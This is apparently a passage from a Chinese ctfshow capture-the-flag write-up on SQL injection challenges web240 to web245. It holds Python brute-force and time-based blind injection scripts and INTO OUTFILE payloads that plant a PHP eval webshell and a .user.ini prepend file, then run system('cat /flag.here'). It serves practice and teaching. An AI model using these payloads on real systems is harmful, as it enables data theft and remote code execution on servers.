<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> itertools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://a31fe426-9043-4aaf-b986-6270c466a4da.challenge.ctf.show/api/insert.php&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> itertools</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">product</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;ab&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> repeat </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    tables </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;flag&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">join</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&#x27;username&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;hellow0rld&#x27;,(select(group_concat(flag))from(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">tables</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">)))#&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token string" style="color:#e3116c">&#x27;password&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web241">web241<a href="#web241" class="hash-link" aria-label="Direct link to web241" title="Direct link to web241">​</a></h3>
<p>delete</p>
<p>sql语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //删除记录</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;delete from  ctfshow_user where id = {$id}&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220112120904123" src="/assets/images/image-20220112120904123-ccdcb24c6e153a483934069f65e87b24.png" width="788" height="168" class="img_ev3q"></p>
<p>api/delete.php中，注入点post发包id参数</p>
<p>然后发现这里也没回显的位置，现在就是盲注。时间盲注或者bool盲注。时间盲注之前有现成的脚本，就用时间了。然后查询语句是按id去一条条查，所以注意时间</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;http://7fba0e79-73e1-452c-a783-9636744de3e1.challenge.ctf.show/api/delete.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">32</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j</span><span class="token operator" style="color:#393A34">=</span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">+</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">==</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag</span><span class="token operator" style="color:#393A34">+=</span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))&lt;{j},sleep(0.02),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">#payload=f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),{i},1))&lt;{j},sleep(0.02),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload</span><span class="token operator" style="color:#393A34">=</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;if(ascii(substr((select group_concat(flag) from flag),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.02),1)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        data</span><span class="token operator" style="color:#393A34">=</span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token string" style="color:#e3116c">&#x27;id&#x27;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">try</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            r</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">post</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">data</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">timeout</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0.38</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">except</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sleep</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0.2</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web242">web242<a href="#web242" class="hash-link" aria-label="Direct link to web242" title="Direct link to web242">​</a></h3>
<p>file，文件读写</p>
<p>sql语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //备份表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/{$filename}&#x27;;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>没接触过，直接看wp了。</p>
<div class="language-mysql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-mysql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">SELECT ... INTO OUTFILE &#x27;file_name&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [CHARACTER SET charset_name]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [export_options]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">export_options:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [{FIELDS | COLUMNS}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [TERMINATED BY &#x27;string&#x27;]//分隔符</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [ESCAPED BY &#x27;char&#x27;]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [LINES</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [STARTING BY &#x27;string&#x27;]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [TERMINATED BY &#x27;string&#x27;]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">“OPTION”参数为可选参数选项，其可能的取值有：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FIELDS TERMINATED BY &#x27;字符串&#x27;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FIELDS ENCLOSED BY &#x27;字符&#x27;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">FIELDS ESCAPED BY &#x27;字符&#x27;：设置转义字符，只能为单个字符。默认值为“\”。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LINES STARTING BY &#x27;字符串&#x27;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LINES TERMINATED BY &#x27;字符串&#x27;：设置每行数据结尾的字符，可以为 单个或多个字符。默认值是“\n”。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>FIELDS TERMINATED BY、 LINES STARTING BY、 LINES TERMINATED BY写马</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">在api/dump.php传POST</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filename=ma.php&#x27; LINES STARTING BY &#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">然后访问url/dump/ma.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url/dump/ma.php?1=system(&#x27;cat /flag.here&#x27;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web243">web243<a href="#web243" class="hash-link" aria-label="Direct link to web243" title="Direct link to web243">​</a></h3>
<p>过滤了php。</p>
<p>我还想着短标签绕后面呢，结果发现自己不是也要传php吗。然后想试试写phtml，结果没有被解析，直接下载下来传的phtml了</p>
<p>看了wp，原来是利用user.ini</p>
<p>然后/dump/页面报没有index.php我觉得他是想明白的告诉用的是nginx。但是谁知道啊，还以为么有呢</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">filename=.user.ini&#x27; lines starting by &#x27;;&#x27; terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">为保证auto_prepend_file=1.jpg在单独一行，所以在开头结尾都加上了0x0a来换行</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后再传1.jpg就好了</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">filename=1.jpg&#x27; LINES STARTING BY &#x27;&lt;?=eval($_GET[1]);?&gt;&#x27;#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后访问</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/dump/index.php?1=system(&#x27;cat /flag.here&#x27;);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web244245">web244、245<a href="#web244245" class="hash-link" aria-label="Direct link to web244、245" title="Direct link to web244、245">​</a></h3>
<p>error 报错注入</p>
<p>sql语句</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  //备份表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  $sql = &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220112131311679" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAVQAAAB2CAYAAACXgWs8AAAcJklEQVR4nO2df1BTZ7rHv3vv/a+NVKlTTQhqAyalu71FITK2ZIRIVBoqow4z7e3sLAjalS6uDF13drt0q/TOtXWwULWLqOztajvjrIw2QSyKutA6bhCxu6ubCJFK+KFVbCH6971/ZN/DOclJcpKc/ACezwwDJ+973vMmJN8874/zfH+k0Wj/DyFiNBpRUlKCrVu3ipaXlpZCrVZj165dfss3btwIs9kc6qUJgiASlv8I56TU1FSMjIyIlhmNRr9iqdFo0NDQAAAkpgRBzDhCElSj0YgdO3YAALZv3y5ap6SkxG+Z0+kkISUIYsbyo3CG/ARBEIQv/xbvDhAEQcwUSFAJgiBkggSVIAhCJkhQCYIgZCIsQX1KrcOGw3bu5/kN1XL3K+5oNBo0NTWJluWVtyGvvE32a+aVt0GpK5SlnUj7p5if7rcNbW6V337mlbdBMT896v0LxHNz0zDwehf3U/PilqhdKxw6zMfQYT4W1WsEev8y1CvMKKhrj2o/vGlqaoJGowlaz2q1wmq1wmg0xqBX8hHWPtT8d0+hp7kGrr9a5e5PwtDQ0IB9+/aJlrkfOGPcG/nIKm6Ee3wAju7GgPVWlVnQe1r4RZlV3IhR+1m47w8A8AgrAEFbjq8OYFWZBZY9Or9tR/v1s6w7iurLu/DFt+ejeh0xPjG8D+fkHey9fijm1+YT6P0bCTmV++Eeu40brfVhnX/ixAk0NDQE3D5ZW1uLkydPoqWlJdxuxo2QBfUpteeDMpPFlP1DOzs7492VsLh4+JWIzs8qbsStywcxaj8jePzqqSpkFTdiodYEALh1+aCPMI/az0AxPw1ZxY24eqoqon6Ew3Nz0wAgLmIqFZP1jai2n8jv387OTqSmpqK2ttbvnZQqlQrHjx+Pcc/kIawINRAFde1QLFjCHbeWT0Uq/KkBbaFnGOY4cwg3WuuhXmGGKmstFAs1UCxYgp7mGmRX7AUAXHivGD+47JKuv6klH0kpT3DHRwosgrJvPr8Fw9uZ3GOntnVhvH+CO9ZoNNDr9X7/2QACCkVeeRueTJ4a0vSeruaEKa+8DY6vDnDHSl0htC9X+gggv41LR4vgvt8Ppa4QSt1aKJ7W4MlkDXpPV2P5+npBHW1uFZau3AYAGHN0CPrJL1sIk996ivnpWKg14eoe8efoHh/AQpj8Pn/AE7EW7bRDMT8d7vv9PuXxEFrAM9Te/48/cmL76uLVeOvHP+MEjpXXr6zlzilqL8M/vx/gjl9dvFpQ/oebx7D3+iHUvLgFb2Z42ilALvf3ueFu/LzrtwAgqMN/3LuPz85J5Y7TPjP49D9Q/4K9f3Mq90OZuZo7